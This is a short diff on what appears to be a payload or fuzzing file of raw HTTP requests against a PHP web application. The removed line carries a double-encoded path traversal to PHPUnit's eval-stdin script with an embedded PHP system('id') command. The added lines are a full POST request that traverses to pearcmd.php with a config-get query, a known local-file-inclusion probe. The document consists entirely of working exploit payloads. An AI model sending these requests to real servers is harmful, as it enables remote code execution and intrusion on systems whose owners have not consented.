@@ -1,1 +1,9 @@
-page_id=4&pagename=templates%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fvendor%252Fevalgadget%252Fsrc%252Futil%252Fphp%252Feval-stdin&z=<?php system('id');?>
+POST /?+config-get+php_dir HTTP/1.1
+Host: wp702.local
+User-Agent: probe/1.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Content-Length: 179
+
+page_id=4&pagename=templates%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fusr%252Flocal%252Flib%252Fphp%252Fpearcmd
